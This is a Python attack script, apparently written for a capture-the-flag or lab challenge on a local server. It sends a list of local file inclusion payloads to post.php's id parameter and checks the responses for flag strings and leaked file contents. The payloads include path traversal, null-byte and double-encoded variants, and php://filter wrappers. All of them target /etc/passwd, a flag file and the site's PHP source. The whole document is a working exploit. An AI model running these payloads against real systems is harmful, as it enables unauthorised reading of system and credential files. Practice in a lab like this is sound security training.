import requests
import re

base_url = "http://127.0.0.1:32891"

print("[+] Comprehensive LFI testing with various encoding and bypass techniques...")

# Common LFI payloads that script kiddies use
lfi_payloads = [
    # Basic
    "../../../etc/passwd",
    "....//....//....//etc/passwd",
    "..\\..\\..\\etc\\passwd",
    
    # Null byte (though deprecated in modern PHP)
    "../../../etc/passwd%00",
    "../../../etc/passwd\x00",
    
    # Encoded
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "..%252F..%252F..%252Fetc%252Fpasswd",  # Double encoded
    
    # Application specific - try to read the flag file directly
    "/flag",
    "/flag.txt",
    "../flag",
    "../flag.txt",
    "../../flag",
    "../../flag.txt",
    "../../../flag",
    "../../../flag.txt",
    
    # Try to read from web root
    "flag",
    "flag.txt",
    ".flag",
    "FLAG",
    "FLAG.txt",
    
    # PHP wrappers
    "php://filter/resource=/flag",
    "php://filter/resource=../flag",
    "php://filter/resource=/flag.txt",
    "php://filter/read=convert.base64-encode/resource=/flag",
    
    # Check if we can read the PHP files themselves
    "index.php",
    "post.php",
    "./index.php",
    "./post.php",
]

findings = []

for payload in lfi_payloads:
    resp = requests.get(f"{base_url}/post.php", params={'id': payload})
    
    # Check response
    if "Post not found" in resp.text:
        status = "Not found"
    elif "traversal" in resp.text.lower():
        status = "Blocked (traversal detection)"
    elif len(resp.text) > 100 and len(resp.text) < 5000:
        # Might be successful read
        status = f"Possible success ({len(resp.text)} bytes)"
        findings.append((payload, resp.text))
        
        # Check for flag
        if 'FLAG{' in resp.text:
            print(f"\n[!!!] FLAG FOUND with payload: {payload}")
            flags = re.findall(r'FLAG\{[^}]+\}', resp.text)
            print(f"Flags: {flags}")
            print("\nFull response:")
            print(resp.text)
            break
        
        # Check for passwd file content (root:x:0:0)
        if 'root:' in resp.text and ':0:0:' in resp.text:
            print(f"\n[!] Successfully read /etc/passwd with: {payload}")
            print(resp.text[:300])
    elif len(resp.text) >= 5000:
        status = f"Large response ({len(resp.text)} bytes)"
    else:
        status = f"Small ({len(resp.text)} bytes)"
    
    print(f"{status:40} | {payload}")

# Show any interesting findings
if findings:
    print("\n\n[+] Interesting findings to examine:")
    for payload, content in findings[:3]:
        print(f"\n{'='*60}")
        print(f"Payload: {payload}")
        print('='*60)
        print(content[:500])

